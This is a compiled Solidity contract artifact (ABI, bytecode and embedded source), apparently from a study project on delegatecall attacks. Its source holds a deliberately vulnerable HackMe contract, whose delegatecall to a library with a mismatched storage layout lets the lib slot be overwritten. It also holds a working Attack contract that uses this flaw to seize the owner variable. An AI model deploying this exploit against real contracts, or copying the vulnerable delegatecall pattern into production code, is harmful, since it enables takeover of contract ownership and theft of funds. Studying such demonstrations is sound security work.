{
  "contractName": "HackMe",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_lib",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "lib",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "someNumber",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_num",
          "type": "uint256"
        }
      ],
      "name": "doSomething",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b506040516105ee3803806105ee83398181016040528101906100319190610114565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f80fd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b6104a28061014c5f395ff3fe608060405234801561000f575f80fd5b506004361061004a575f3560e01c80638da5cb5b1461004e578063928012301461006c578063931c9b991461008a578063a6b206bf146100a8575b5f80fd5b6100566100c4565b60405161006391906102a9565b60405180910390f35b6100746100e9565b60405161008191906102a9565b60405180910390f35b61009261010c565b60405161009f91906102da565b60405180910390f35b6100c260048036038101906100bd9190610321565b610112565b005b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168260405160240161015b91906102da565b6040516020818303038152906040527fa6b206bf000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101e591906103b8565b5f60405180830381855af49150503d805f811461021d576040519150601f19603f3d011682016040523d82523d5f602084013e610222565b606091505b5050905080610266576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161025d9061044e565b60405180910390fd5b5050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102938261026a565b9050919050565b6102a381610289565b82525050565b5f6020820190506102bc5f83018461029a565b92915050565b5f819050919050565b6102d4816102c2565b82525050565b5f6020820190506102ed5f8301846102cb565b92915050565b5f80fd5b610300816102c2565b811461030a575f80fd5b50565b5f8135905061031b816102f7565b92915050565b5f60208284031215610336576103356102f3565b5b5f6103438482850161030d565b91505092915050565b5f81519050919050565b5f81905092915050565b5f5b8381101561037d578082015181840152602081019050610362565b5f8484015250505050565b5f6103928261034c565b61039c8185610356565b93506103ac818560208601610360565b80840191505092915050565b5f6103c38284610388565b915081905092915050565b5f82825260208201905092915050565b7f4661696c656420746f20696e766f6b65204861636b4d652e646f536f6d6574685f8201527f696e672100000000000000000000000000000000000000000000000000000000602082015250565b5f6104386024836103ce565b9150610443826103de565b604082019050919050565b5f6020820190508181035f8301526104658161042c565b905091905056fea2646970667358221220db07585e9ae2aa1161a19f06001b79b42fc3c6db7f96e075ca4b14cd9816ba5e64736f6c63430008150033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.13;\r\n\r\ncontract Lib {\r\n    uint public someNumber;\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        someNumber = _num;\r\n    }\r\n}\r\n\r\n\r\ncontract HackMe {\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n\r\n\r\n    constructor(address _lib) {\r\n        lib = _lib;\r\n        owner = msg.sender;\r\n    }\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        (bool rent, ) = lib.delegatecall(abi.encodeWithSignature(\"doSomething(uint256)\", _num));\r\n        require(rent, \"Failed to invoke HackMe.doSomething!\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n    address public attacker;\r\n\r\n\r\n    HackMe public hackMe;\r\n\r\n\r\n    constructor(HackMe _hackMe) {\r\n        hackMe = HackMe(_hackMe);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n\r\n    function attack() public {\r\n        hackMe.doSomething(uint(uint160(address(this))));\r\n\r\n        hackMe.doSomething(uint(uint160(attacker)));\r\n    }\r\n\r\n    function doSomething(uint _num) public {\r\n        owner = address(uint160(_num));\r\n    }\r\n}",
  "sourcePath": "D:\\workPlace\\\\9\\\\Attack\\DelegateCall\\contracts\\HackMe.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.21+commit.d9974bed.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-12T07:59:03.690Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}